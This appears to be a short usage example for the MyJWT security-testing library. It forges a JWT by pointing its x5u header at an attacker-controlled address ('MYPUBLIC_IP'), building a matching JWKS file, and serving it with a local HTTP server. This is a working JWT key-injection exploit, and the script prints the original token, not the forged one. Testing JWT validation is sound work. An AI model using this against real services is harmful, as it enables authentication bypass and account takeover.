from MyJWT.vulnerabilities import x5uVulnerability

jwt = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly90ZXN0LmNvbSJ9.eyJ1c2VyIjoiaGFja2VyIn0.Z57BGf-BW"
    "WGCYGRST3PstC7dqFVxLpYh8D9iy6z8_tpz8vIESa5IdLt3hkM8ysB0IjrkWbgNMYTaP7YiGpHG7MhF_IAc_q8HOilMtvrVTyJ0EpE3uJ"
    "okXZSh_hhU5ay2K8H743AG_5x7coAf7ZsNe_rnSuDN6iV_oXo31H2ga9VMk2BLgvqFLYgIYVETeQbcSx4M2rxiH20VbqO4dwzYDedYkD"
    "AHKGHUAI0eXJoJ7Sq3sDrjZ9_THTiHSwQQYFnlIbIcFKuANdExuhG-tmIhfa6-8Zu_RELLL6UzgL2G-yu021B_Hm9YmwuXewtDktXKY"
    "uWofo-PVFUUWVSEw7gIAw"
)
newJwt = x5uVulnerability(jwt=jwt, url="MYPUBLIC_IP")
# optionals param crt, pem (check documentation).
# this function will create a new json file for your new jwks (named: jwks_with_x5c.json)
print(jwt)
# don't forget to create a server before send your new jwt
# like python -m http.server --bind MYPUBLIC_IP 8080
